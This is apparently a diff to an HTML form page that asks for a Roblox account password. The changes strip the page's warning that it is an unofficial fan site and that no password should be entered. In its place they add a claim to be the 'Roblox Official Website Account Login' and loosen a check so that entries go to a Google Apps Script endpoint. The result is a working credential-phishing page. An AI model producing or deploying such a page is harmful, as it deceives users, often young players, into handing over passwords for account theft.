@@ -93,7 +93,7 @@
 </head>
 <body>
   <main class="panel">
-    <div class="logo">ROBLOX <span>HUB</span></div>
+    <div class="logo">ROBLOX <span>ACCOUNT</span></div>
     <p>Roblox Login Data</p>
 
     <form id="feedbackForm">
@@ -104,7 +104,7 @@
 
       <label for="message">Kata laluan akaun Roblox anda</label>
       <textarea id="message" maxlength="2000"
-        placeholder="Your Roblox password account"
+        placeholder="Your Roblox password account . . ."
         required></textarea>
 
       <button type="submit">Login Roblox ↗</button>
@@ -112,8 +112,8 @@
     </form>
 
     <p class="notice">
-      Fan-made feedback website. Bukan laman rasmi Roblox.
-      Jangan masukkan kata laluan atau kod pengesahan.
+      Laman Resmi Roblox Log Masuk Akaun.
+      Roblox Official Website Account Login.
     </p>
   </main>
 
@@ -137,9 +137,9 @@
           return;
         }
 
-        if (scriptURL === "https://script.google.com/macros/s/AKfycbzUeqm2pyOHcKBd4METO1JOGFZ-9lNBkrJirulz-CuEyoSOd4wsQkHh0Znmf6o12sKyXg/exec") {
+        if (scriptURL === "") {
           status.textContent =
-            "Sila tetapkan URL Google Apps Script dahulu.";
+            "Error.";
           return;
         }
 
